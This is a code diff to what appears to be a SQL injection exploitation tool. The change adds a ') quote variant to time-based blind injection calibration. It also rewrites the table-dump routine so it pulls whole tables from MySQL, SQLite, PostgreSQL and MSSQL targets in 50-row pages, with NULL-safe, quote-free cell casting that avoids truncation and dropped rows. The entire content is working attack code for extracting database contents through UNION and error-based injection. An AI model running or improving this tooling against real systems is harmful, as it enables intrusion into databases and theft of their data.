@@ -297,7 +297,7 @@ def time_calibrate(http, url, param, value, n=2, console=None):
         return None
     threshold = base + n * 0.6
     for dbms, tmpl in _SLEEP.items():
-        for q in ("", "'", '"'):
+        for q in ("", "'", '"', "')"):           # match _quote_for (union/blind also try ') )
             t0 = time.monotonic()
             _inject(http, url, param, tmpl.format(v=value, q=q, c="1=1", n=n, cm=_COMMENT))
             if (time.monotonic() - t0) < threshold:
@@ -752,19 +752,54 @@ def _agg_catalog(value_fn, dbms, marks, which, db=None, **fmt):
     return [x for x in data.split(marks.rowsep) if x]
 
 
+_DUMP_BLOCK = 50           # rows per dump request — keeps each group_concat well under
+                           # MySQL's group_concat_max_len (1024 B default) vs truncating
+_DUMP_CAP = 10000          # safety bound so a huge/echoing table can't loop forever
+
+
+def _cell(dbms, c):
+    """A dump cell: cast to text and NULL-coalesced to a quote-free empty string. A raw
+    NULL would make concat/|| yield NULL for the whole row, and group_concat then skips
+    it — silently dropping the row. ('' would re-introduce a quote, breaking quote-free.)
+    varchar(max) on MSSQL also dodges string_agg's 8000-byte cap on varchar(4000)."""
+    if dbms == "mysql":
+        return f"coalesce(cast({c} as char),substr(char(32),2))"
+    if dbms == "sqlite":
+        return f"coalesce(cast({c} as text),substr(char(32),2))"
+    if dbms == "postgres":
+        return f"coalesce(cast({c} as varchar),substr(chr(32),2))"
+    return f"coalesce(cast({c} as varchar(max)),substring(char(32),2,1))"   # mssql
+
+
+def _window(dbms, src, n, off):
+    """`src` limited to a block of n rows from offset off, ordered for a stable page and
+    aliased, so it can be aggregated on its own — the dump reads a table block by block."""
+    if dbms == "mssql":
+        return f"(SELECT * FROM {src} ORDER BY 1 OFFSET {off} ROWS FETCH NEXT {n} ROWS ONLY) _w"
+    return f"(SELECT * FROM {src} ORDER BY 1 LIMIT {n} OFFSET {off}) _w"
+
+
 def _agg_dump(value_fn, dbms, marks, table, cols, db=None):
-    """Read a whole table as one group_concat'd string through a value channel, then
-    split rows/cols. Shared by the UNION and error-based dumps."""
+    """Read a table through a value channel (UNION or error-based) and split rows/cols.
+    Paginated in row blocks so a big table isn't silently cut at group_concat_max_len,
+    and every cell NULL-coalesced so a NULL column can't drop its row. Shared by both."""
     colsep = _strlit(dbms, marks.colsep)
     parts = []
     for i, c in enumerate(cols):
         if i:
             parts.append(colsep)
-        parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
+        parts.append(_cell(dbms, c))
     row = _ucat(dbms, parts)
     src = _qualify(dbms, db, table)
-    data = value_fn(f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {src}")
-    return [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
+    rows, off = [], 0
+    while off < _DUMP_CAP:
+        data = value_fn(f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {_window(dbms, src, _DUMP_BLOCK, off)}")
+        got = [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
+        rows.extend(got)
+        if len(got) < _DUMP_BLOCK:
+            break
+        off += _DUMP_BLOCK
+    return rows
 
 
 def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
